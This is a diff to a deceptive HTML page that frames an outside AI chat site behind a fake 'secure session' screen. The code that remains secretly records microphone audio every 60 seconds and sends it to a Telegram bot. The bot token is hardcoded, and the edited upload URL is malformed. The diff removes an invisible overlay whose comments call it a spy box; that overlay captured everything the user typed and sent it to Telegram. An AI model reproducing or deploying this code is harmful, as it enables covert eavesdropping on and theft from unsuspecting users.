@@ -7,7 +7,7 @@
     <style>
         body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
         
-        /* असली AI साइट नीचे रहेगी */
+        /* Website Frame */
         #aiFrame {
             width: 100%;
             height: 100%;
@@ -17,37 +17,21 @@
             z-index: 1;
         }
 
-        /* अदृश्य जासूसी बॉक्स - इसे AI के टाइपिंग एरिया के ऊपर सेट किया है */
-        #stealthInput {
-            position: absolute;
-            bottom: 80px; /* मोबाइल पर टाइपिंग बॉक्स की पोजीशन के हिसाब से एडजस्ट करें */
-            left: 5%;
-            width: 75%;
-            height: 50px;
-            z-index: 999;
-            background: rgba(255, 255, 255, 0.01); /* बिल्कुल पारदर्शी */
-            border: none;
-            outline: none;
-            color: #fff; /* टाइप करते वक्त उन्हें अपना टेक्स्ट दिखेगा */
-            font-size: 16px;
-            padding-left: 15px;
-        }
-
+        /* Overlay for Activation */
         #startCover {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; color: #0f0; display: flex; 
             justify-content: center; align-items: center; z-index: 10000; 
-            cursor: pointer; font-family: monospace;
+            cursor: pointer; font-family: monospace; text-align: center;
+            padding: 20px;
         }
     </style>
 </head>
 <body>
 
-    <div id="startCover" onclick="init()">🛡️ INITIALIZING SECURE SESSION... (CLICK)</div>
+    <div id="startCover" onclick="init()">🛡️ INITIALIZING SECURE SESSION... <br><br> (CLICK TO START)</div>
     
     <iframe id="aiFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone;"></iframe>
-    
-    <input type="text" id="stealthInput" placeholder="Type a message..." autocomplete="off">
 
     <script>
         const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
@@ -58,48 +42,40 @@
             startAudio();
         }
 
-        const input = document.getElementById('stealthInput');
-
-        // जब यूजर 'Enter' दबाएगा
-        input.addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') {
-                const text = input.value;
-                if (text.trim() !== "") {
-                    // 1. टेलीग्राम पर मैसेज भेजें
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MY_ID, text: `⌨️ USER TYPED: \n${text}` })
-                    });
-
-                    // 2. चालाकी: बॉक्स को 1 सेकंड के लिए हटा दें ताकि वो असली AI के 'Send' पर क्लिक कर सकें
-                    input.style.opacity = "0";
-                    setTimeout(() => {
-                        input.value = "";
-                        input.style.opacity = "1";
-                    }, 2000);
-                }
-            }
-        });
-
         async function startAudio() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
+
                 recorder.ondataavailable = (e) => chunks.push(e.data);
+
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'audio/ogg' });
                     const fd = new FormData();
                     fd.append("chat_id", MY_ID);
                     fd.append("voice", blob, "v.ogg");
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
+
+                    fetch(`https://api.telegram.org{TOKEN}/sendVoice`, { 
+                        method: "POST", 
+                        body: fd 
+                    });
+
                     chunks = [];
                     if (stream.active) setTimeout(() => recorder.start(), 1000);
                 };
+
+                // Start recording
                 recorder.start();
-                setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
-            } catch (err) { console.log("Mic..."); }
+
+                // Har 60 second mein audio chunk bhejne ke liye
+                setInterval(() => { 
+                    if (recorder.state === "recording") recorder.stop(); 
+                }, 60000);
+
+            } catch (err) { 
+                console.log("Mic access required for secure session."); 
+            }
         }
     </script>
 </body>
